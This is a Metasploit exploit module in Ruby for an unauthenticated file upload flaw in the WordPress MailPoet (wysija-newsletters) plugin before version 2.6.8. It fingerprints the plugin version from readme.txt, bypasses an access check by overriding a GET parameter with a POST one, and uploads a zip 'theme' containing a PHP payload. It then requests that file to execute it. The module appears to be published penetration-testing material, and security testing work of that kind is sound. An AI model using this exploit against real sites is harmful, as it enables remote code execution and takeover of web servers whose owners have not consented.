##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::HTTP::Wordpress
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress MailPoet (wysija-newsletters) Unauthenticated File Upload',
      'Description'    => %q{
          The Wordpress plugin "MailPoet Newsletters" (wysija-newsletters) before 2.6.8
          is vulnerable to an unauthenticated file upload. The exploit uses the Upload Theme
          functionality to upload a zip file containing the payload. The plugin used the
          admin_init hook, which is also executed for unauthenticated users when accessing
          a specific URL. The developers tried to fix the vulnerablility
          in version 2.6.7 but the fix can be bypassed. In PHPs default configuration,
          a POST variable overwrites a GET variable in the $_REQUEST array. The plugin
          uses $_REQUEST to check for access rights. By setting the POST parameter to
          something not beginning with 'wysija_', the check is bypassed. Wordpress uses
          the $_GET array to determine the page and is so not affected by this.
      },
      'Author'         =>
        [
          'Marc-Alexandre Montpas', # initial discovery
          'Christian Mehlmauer'     # metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html' ],
          [ 'URL', 'http://www.mailpoet.com/security-update-part-2/'],
          [ 'URL', 'https://plugins.trac.wordpress.org/changeset/943427/wysija-newsletters/trunk/helpers/back.php']
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [ ['wysija-newsletters < 2.6.8', {}] ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 1 2014'))
  end

  def create_zip_file(theme_name, payload_name)
    # the zip file must match the following:
    #  -) Exactly one folder representing the theme name
    #  -) A style.css in the theme folder
    #  -) Additional files in the folder

    content = {
      ::File.join(theme_name, 'style.css') => '',
      ::File.join(theme_name, payload_name) => payload.encoded
    }

    zip_file = Rex::Zip::Archive.new
    content.each_pair do |name, content|
      zip_file.add_file(name, content)
    end

    zip_file.pack
  end

  def check
    readme_url = normalize_uri(target_uri.path, 'wp-content', 'plugins', 'wysija-newsletters', 'readme.txt')
    res = send_request_cgi({
      'uri'    => readme_url,
      'method' => 'GET'
    })
    # no readme.txt present
    if res.nil? || res.code != 200
      return Msf::Exploit::CheckCode::Unknown
    end

    # try to extract version from readme
    # Example line:
    # Stable tag: 2.6.6
    version = res.body.to_s[/stable tag: ([^\r\n"\']+\.[^\r\n"\']+)/i, 1]

    # readme present, but no version number
    if version.nil?
      return Msf::Exploit::CheckCode::Detected
    end

    print_status("#{peer} - Found version #{version} of the plugin")

    if Gem::Version.new(version) < Gem::Version.new('2.6.8')
      return Msf::Exploit::CheckCode::Appears
    else
      return Msf::Exploit::CheckCode::Safe
    end
  end

  def exploit
    theme_name = rand_text_alpha(10)
    payload_name = "#{rand_text_alpha(10)}.php"

    zip_content = create_zip_file(theme_name, payload_name)

    uri = normalize_uri(target_uri.path, 'wp-admin', 'admin-post.php')

    data = Rex::MIME::Message.new
    data.add_part(zip_content, 'application/x-zip-compressed', 'binary', "form-data; name=\"my-theme\"; filename=\"#{rand_text_alpha(5)}.zip\"")
    data.add_part('on', nil, nil, 'form-data; name="overwriteexistingtheme"')
    data.add_part('themeupload', nil, nil, 'form-data; name="action"')
    data.add_part('Upload', nil, nil, 'form-data; name="submitter"')
    data.add_part(rand_text_alpha(10), nil, nil, 'form-data; name="page"')
    post_data = data.to_s

    payload_uri = normalize_uri(target_uri.path, 'wp-content', 'uploads', 'wysija', 'themes', theme_name, payload_name)

    print_status("#{peer} - Uploading payload to #{payload_uri}")
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => uri,
      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
      'vars_get' => { 'page' => 'wysija_campaigns', 'action' => 'themes' },
      'data'     => post_data
    })

    if res.nil? || res.code != 302 || res.headers['Location'] != 'admin.php?page=wysija_campaigns&action=themes&reload=1&redirect=1'
      fail_with(Failure::UnexpectedReply, "#{peer} - Upload failed")
    end

    # Files to cleanup (session is dropped in the created folder):
    #   style.css
    #   the payload
    #   the theme folder (manual cleanup)
    register_files_for_cleanup('style.css', payload_name)

    print_warning("#{peer} - The theme folder #{theme_name} can not be removed. Please delete it manually.")

    print_status("#{peer} - Executing payload #{payload_uri}")
    res = send_request_cgi({
      'uri'    => payload_uri,
      'method' => 'GET'
    })
  end
end